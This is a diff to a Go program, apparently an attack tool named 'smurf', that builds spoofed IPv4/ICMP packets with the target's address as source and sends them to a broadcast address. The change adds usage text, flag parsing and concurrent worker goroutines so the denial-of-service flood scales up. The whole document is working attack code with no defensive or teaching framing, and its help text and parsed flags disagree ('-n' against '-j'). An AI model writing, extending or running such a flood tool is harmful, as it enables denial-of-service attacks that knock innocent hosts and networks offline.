@@ -5,17 +5,30 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"strconv"
+	"sync"
 	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
-	_"github.com/google/gopacket/pcap"
 	"golang.org/x/net/ipv4"
 )
 func init() {
 	// initialize global pseudo random generator
 	rand.Seed(time.Now().Unix())
 }
+
+const HelpMessage string = "Usage:\n" +
+							"\tsmurf -t target" +
+							"\t-b broadcast" +
+							"\t[-w workers]" +
+							"\t[-n jobs]\n\n" +
+							"\tOptions:\n\t" +
+							"\t-t target: IP address of target machine. Must be in IPv4 format.\n" +
+							"\t-b broadcast: broadcast IP address. Must be in IPv4 format.\n" +
+							"\t-w workers: amount of workers executing smurf attack. Defaults to 1.\n" +
+							"\t-n jobs: number of jobs per worker. Defaults to 1.\n"							
+							
 
 func createHeader(header *layers.IPv4, src net.IP, dst net.IP) {
 	header.Version = 0x04
@@ -85,29 +98,95 @@ func start(src net.IP, dest net.IP) {
 		return
 	}
 	if err = rawConn.WriteTo(ipHeader, payloadBuf.Bytes(), nil); err != nil {
-		
 		fmt.Println(err)
 		return
 	}
-	
+	return
+}
+
+func exit(message string) {
+	fmt.Print("Error: " + message + "\n" + HelpMessage)
+	os.Exit(0)
+}
+
+func smurfWorker(src net.IP, dst net.IP, jobs uint16, wg *sync.WaitGroup) {
+	for i := uint16(0); i < jobs; i++ {
+		start(src, dst)
+	}
+	wg.Done()
+}
+
+func executeSmurf(src net.IP, dst net.IP, workers uint16, jobs uint16) {
+	var wg sync.WaitGroup
+	for i := uint16(0); i < workers; i++ {
+        wg.Add(1)
+        go smurfWorker(src, dst, jobs, &wg)
+    }
+	wg.Wait()
 }
 
 func main() {
-	args := os.Args
-	if len(args) != 3 {
-		fmt.Println("Usage: <target> <broadcast>")
-		return
+	var (
+		target string
+		broadcast string
+		workers uint16 = 1
+		jobs uint16 = 1
+	)
+	if len(os.Args) < 3 {
+		exit(" target and broadcast required ")
 	}
-	src := net.ParseIP(args[1])
+	for i := 1; i < len(os.Args); i += 1 {
+		switch os.Args[i] {
+		case "-t":
+			if i == len(os.Args)-1 {
+				exit("target address should be specified")
+			}
+			i += 1
+			target = os.Args[i]
+		case "-b":
+			if i == len(os.Args)-1 {
+				exit("broadcast address should be specified")
+			}
+			i += 1
+			broadcast = os.Args[i]
+		case "-w":
+			if i == len(os.Args)-1 {
+				exit("workers amount should be specified")
+			}
+			i += 1
+			w, err := strconv.ParseUint(os.Args[i], 10, 16)
+			if err != nil {
+				exit("workers amount should be specified")
+			}
+			workers = uint16(w)
+		case "-j":
+			if i == len(os.Args)-1 {
+				exit("jobs amount should be specified")
+			}
+			i += 1
+			j, err := strconv.ParseUint(os.Args[i], 10, 16)
+			if err != nil {
+				exit("workers amount should be specified")
+			}
+			jobs = uint16(j)
+		default:
+			exit("unrecognised option: " + os.Args[i])
+		}
+	}
+	if target == "" {
+		exit("target address should be specified")
+	}
+	
+	if broadcast == "" {
+		exit("broadcast address should be specified")
+	}
+	src := net.ParseIP(target)
 	if src == nil {
-		fmt.Println("Wrong target ip address!")
-		return
+		exit("Wrong target ip address!")
 	}
-	dst := net.ParseIP(args[2])
+	dst := net.ParseIP(broadcast)
 	if dst == nil {
-		
-		fmt.Println("Wrong broadcast ip address!")
-		return
+		exit("Wrong broadcast ip address!")
 	}
-	start(src, dst)
+	executeSmurf(src, dst, workers, jobs)
 }
